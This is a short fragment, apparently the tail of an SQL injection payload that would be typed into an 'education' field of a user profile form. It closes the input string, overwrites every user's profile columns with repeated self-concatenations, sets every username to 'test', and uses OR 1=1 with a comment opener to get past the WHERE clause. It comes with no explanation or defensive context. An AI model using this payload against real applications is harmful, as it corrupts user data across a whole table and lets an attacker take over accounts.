...
INPUT_education', username= 'test', first_name= first_name || first_name || first_name || first_name || first_name || first_name || first_name || first_name || first_name || first_name || first_name || first_name, last_name= last_name || last_name || last_name || last_name || last_name || last_name || last_name || last_name || last_name || last_name || last_name || last_name || last_name, password= password, education= education || education || education || education || education || education || education || education || education || education || education || education, employment= employment || employment || employment || employment || employment || employment || employment || employment || employment || employment || employment || employment, music= music || music || music || music || music || music || music || music || music || music || music || music, movie= movie || movie || movie || movie || movie || movie || movie || movie || movie || movie || movie || movie, nationality= nationality || nationality || nationality || nationality || nationality || nationality || nationality || nationality || nationality || nationality || nationality || nationality, birthday= birthday WHERE username='' OR 1=1;/*
